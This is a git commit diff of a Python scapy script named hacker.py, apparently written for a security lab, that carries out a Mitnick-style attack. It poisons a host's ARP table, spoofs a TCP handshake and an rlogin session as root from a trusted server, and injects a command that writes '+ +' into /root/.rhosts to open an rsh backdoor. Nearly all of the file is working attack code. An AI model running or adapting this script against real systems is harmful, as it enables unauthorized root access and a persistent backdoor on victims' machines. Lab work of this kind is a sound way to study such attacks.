4a6e70154e61fe18b0d3eadd2fbcf3872d489957
Luis Felipe Risch <luis.risch@gmail.com>
2024-07-14 16:28:28 -0300

    finished script

--- volumes/hacker.py
+++ volumes/hacker.py
@@ -5,102 +5,99 @@ import os
 
 SPOOF_DELAY = 2
 
-attacker_ip       = '10.9.0.1'
-x_terminal_ip     = '10.9.0.5'
-trusted_server_ip = '10.9.0.6'
-attacker_mac      = scapy.get_if_hwaddr('br-1a83e0f2eaca')
+TARGET_PORT = 513
+SOURCE_PORT = 1023
 
-client_username = "root"
-server_username = "root"
-terminal_info   = "xterm/38400"
+INITIAL_SEQUENCE_NUMBER = 1000
 
-stop_spoofing = False
+X_TERMINAL_IP     = '10.9.0.5'
+TRUSTED_SERVER_IP = '10.9.0.6'
 
-def tcp_three_way_handshake(target_ip, target_port, source_ip, source_port):
-  # Step 1: Send SYN packet
-  syn_packet = scapy.IP(src=source_ip, dst=target_ip) / scapy.TCP(sport=source_port, dport=target_port, flags="S", seq=1000)
-  print(f"[*] Sending SYN packet from {source_ip}:{source_port} to {target_ip}:{target_port}")
-  syn_ack_packet = scapy.sr1(syn_packet, timeout=1, verbose=False)
+SYN_FLAG     = 'S'
+SYN_ACK_FLAG = 'SA'
+ACK_FLAG     = 'A'
+PSH_ACK_FLAG = 'PA'
 
-  # Check if we received a SYN-ACK
-  if syn_ack_packet and syn_ack_packet.haslayer(scapy.TCP) and syn_ack_packet[scapy.TCP].flags == "SA":
-    print("[*] Received SYN-ACK packet")
+ZERO_BYTE       = b'\x00'
+CLIENT_USERNAME = "root"
+SERVER_USERNAME = "root"
+TERMINAL_INFO   = "xterm/38400"
 
-    # Step 2: Send ACK packet
-    ack_packet = scapy.IP(src=source_ip, dst=target_ip) / scapy.TCP(sport=source_port, dport=target_port, flags="A", seq=syn_ack_packet.ack, ack=syn_ack_packet.seq + 1)
-    scapy.send(ack_packet, verbose=False)
-    print("[*] Sent ACK packet")
+BACKDOOR_COMMAND = 'echo "+ +" >> /root/.rhosts\r'
 
-    # At this point, the TCP three-way handshake is complete
-    print("[*] TCP three-way handshake completed successfully")
-
-    # Constrói o pacote TCP com o payload
-    payload = b"\x00" + client_username.encode() + b"\x00" + server_username.encode() + b"\x00" + terminal_info.encode() + b"\x00"
-    rlogin_packet = scapy.IP(src=source_ip, dst=target_ip) / scapy.TCP(sport=source_port, dport=target_port, flags="PA", seq=syn_ack_packet.ack, ack=syn_ack_packet.seq + 1) / scapy.Raw(load=payload)
-  
-    # Envia o pacote e recebe a resposta
-    rlogin_response_packet = scapy.sr1(rlogin_packet, timeout=1, verbose=False)
-    if rlogin_response_packet and rlogin_response_packet.haslayer(scapy.TCP) and rlogin_response_packet[scapy.TCP].flags == "A" and rlogin_response_packet.haslayer(scapy.Raw) == 0:
-      print("Rlogin connection established successfully.")
-
-      payload = 'echo "+ +" >> /root/.rhosts\r'.encode()
-      packet  = scapy.IP(src=source_ip, dst=target_ip) / scapy.TCP(sport=source_port, dport=target_port, flags="PA", seq=rlogin_response_packet.ack, ack=rlogin_response_packet.seq + 1) / scapy.Raw(load=payload)
-      response = scapy.sr1(packet, timeout=1, verbose=False)
-
-      response.show()
-
-      # ack_packet = scapy.IP(src=source_ip, dst=target_ip) / scapy.TCP(sport=source_port, dport=target_port, flags="A", seq=response.ack, ack=response.seq + 1)
-      # response = scapy.sr1(ack_packet, timeout=1, verbose=False)
-
-      # send ack for rlogin response packet
-      # ack_packet            = scapy.IP(src=source_ip, dst=target_ip) / scapy.TCP(sport=source_port, dport=target_port, flags="A", seq=rlogin_response_packet.ack, ack=rlogin_response_packet.seq + 1)
-      # login_packet_response = scapy.sr1(ack_packet, timeout=1, verbose=False)
-
-      # if login_packet_response and login_packet_response.haslayer(scapy.TCP) and login_packet_response[scapy.TCP].flags == "PAU": 
-      #   print("Successfully logged in server")
-    else: 
-      print("Failed to establish rlogin connection or invalid response.")
-  else:
-    print("[!] SYN-ACK packet not received. Handshake failed.")
-
+# Broadcast with who-has operation to poison arp table. It tells that the trusted-server's ip is located at the attacker's mac address.
 def spoof(): 
   packet = scapy.ARP(op=1, 
-                     pdst=x_terminal_ip,
-                     psrc=trusted_server_ip, 
-                     hwsrc=attacker_mac)
+                     pdst=X_TERMINAL_IP,
+                     psrc=TRUSTED_SERVER_IP)
   scapy.send(packet, verbose=False)
 
+# Infinite loop with a little delay to keep arp table poisoned.
 def spoof_loop():
+  global stop_spoofing
+
   while not stop_spoofing:
     spoof()
     sleep(SPOOF_DELAY)
 
-
-def batata():
-  global stop_spoofing
-
-  spoof() # ensure spoof is done
-  tcp_three_way_handshake(x_terminal_ip, 513, trusted_server_ip, 1023)
-
-  stop_spoofing = True
-
 def disable_ip_forward(): 
   os.system('echo 0 > /proc/sys/net/ipv4/ip_forward')
 
-def disable_send_redirects(): 
-  os.system('echo 0 | tee /proc/sys/net/ipv4/conf/*/send_redirects')
-
 def setup_attacker_env():
+  print("   Disabling ip forward...")
   disable_ip_forward()
-  disable_send_redirects()
+  print("   Ip forward disabled!")
 
-setup_attacker_env()
+if __name__ == "__main__":
+  print('Setting up attacker environment...')
+  setup_attacker_env()
+  print('Attacker environment configured!\n')
 
-spoof_thread  = Thread(target=spoof_loop)
-batata_thread = Thread(target=batata)
+  stop_spoofing = False
 
-spoof_thread.start()
-batata_thread.start()
+  spoof_thread = Thread(target=spoof_loop)
+  spoof_thread.start()
+  
+  # Ensure that the arp table is poisoned
+  spoof()
 
-spoof_thread.join()
-batata_thread.join()
+  # Step 1: Send SYN packet
+  syn_packet     = scapy.IP(src=TRUSTED_SERVER_IP, dst=X_TERMINAL_IP) / scapy.TCP(sport=SOURCE_PORT, dport=TARGET_PORT, flags=SYN_FLAG, seq=INITIAL_SEQUENCE_NUMBER)
+  syn_ack_packet = scapy.sr1(syn_packet, timeout=1, verbose=False)
+  print(f"SYN packet SENT from {TRUSTED_SERVER_IP}:{SOURCE_PORT} to {X_TERMINAL_IP}:{TARGET_PORT}")
+  if syn_ack_packet and syn_ack_packet.haslayer(scapy.TCP) and syn_ack_packet[scapy.TCP].flags == SYN_ACK_FLAG:
+    print(f"Received SYN-ACK packet from {X_TERMINAL_IP}:{TARGET_PORT}")
+
+    # Step 2: Send ACK packet
+    ack_packet = scapy.IP(src=TRUSTED_SERVER_IP, dst=X_TERMINAL_IP) / scapy.TCP(sport=SOURCE_PORT, dport=TARGET_PORT, flags=ACK_FLAG, seq=syn_ack_packet.ack, ack=syn_ack_packet.seq + 1)
+    scapy.send(ack_packet, verbose=False)
+    print(f"ACK packet SENT from {TRUSTED_SERVER_IP}:{SOURCE_PORT} to {X_TERMINAL_IP}:{TARGET_PORT}")
+
+    # At this point, the TCP three-way handshake is complete
+    print("\nTCP three-way handshake completed successfully!\n")
+
+    # Step 3: Send rlogin packet
+    rlogin_packet_payload  = ZERO_BYTE + CLIENT_USERNAME.encode() + ZERO_BYTE + SERVER_USERNAME.encode() + ZERO_BYTE + TERMINAL_INFO.encode() + ZERO_BYTE
+    rlogin_packet          = scapy.IP(src=TRUSTED_SERVER_IP, dst=X_TERMINAL_IP) / scapy.TCP(sport=SOURCE_PORT, dport=TARGET_PORT, flags=PSH_ACK_FLAG, seq=syn_ack_packet.ack, ack=syn_ack_packet.seq + 1) / scapy.Raw(load=rlogin_packet_payload)
+    rlogin_response_packet = scapy.sr1(rlogin_packet, timeout=1, verbose=False)
+    print(f"rlogin packet SENT from {TRUSTED_SERVER_IP}:{SOURCE_PORT} to {X_TERMINAL_IP}:{TARGET_PORT}")
+
+    if rlogin_response_packet and rlogin_response_packet.haslayer(scapy.TCP) and rlogin_response_packet[scapy.TCP].flags == "A" and rlogin_response_packet.haslayer(scapy.Raw) == 0:
+      print("\nrlogin connection established successfully!\n")
+
+      # Step 4: Send backdoor packet. Make xterminal accept remote access to any host
+      backdoor_packet_payload = BACKDOOR_COMMAND.encode()
+      backdoor_packet         = scapy.IP(src=TRUSTED_SERVER_IP, dst=X_TERMINAL_IP) / scapy.TCP(sport=SOURCE_PORT, dport=TARGET_PORT, flags=PSH_ACK_FLAG, seq=rlogin_response_packet.ack, ack=rlogin_response_packet.seq + 1) / scapy.Raw(load=backdoor_packet_payload)
+      scapy.send(backdoor_packet, verbose=False)
+
+      print(f"Backdoor packet SENT from {TRUSTED_SERVER_IP}:{SOURCE_PORT} to {X_TERMINAL_IP}:{TARGET_PORT}")
+    else: 
+      print("Failed to establish rlogin connection.")
+  else:
+    print("Handshake failed.")
+
+  print(f"\nAt this point, you may have remote access via rsh with xterminal. When this script stops running, just type on terminal the following command: rsh {X_TERMINAL_IP}. Bye bye :)")
+
+  stop_spoofing = True
+
+  spoof_thread.join()
